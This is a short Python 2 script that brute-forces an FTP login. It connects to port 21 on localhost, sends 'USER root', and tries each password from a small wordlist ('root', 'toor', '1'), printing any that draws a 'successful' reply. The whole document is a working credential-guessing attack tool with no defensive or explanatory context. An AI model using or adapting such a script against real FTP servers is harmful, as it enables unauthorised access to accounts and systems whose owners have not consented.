#!/usr/bin/env python

from socket import *


#.....Wordlist.....#
wordlist = [
"root",
"toor",
"1",
]


for i in wordlist:
  try:
    s = socket()
    s.connect(("127.0.0.1", 21))
    #print i 
    s.recv(2048)
    s.send("USER root\n")
    s.recv(2048)
    s.send("PASS " + i + "\n")
    response = s.recv(2048)
    if "successful" in response:
	print "Successful", i
  except:
    continue
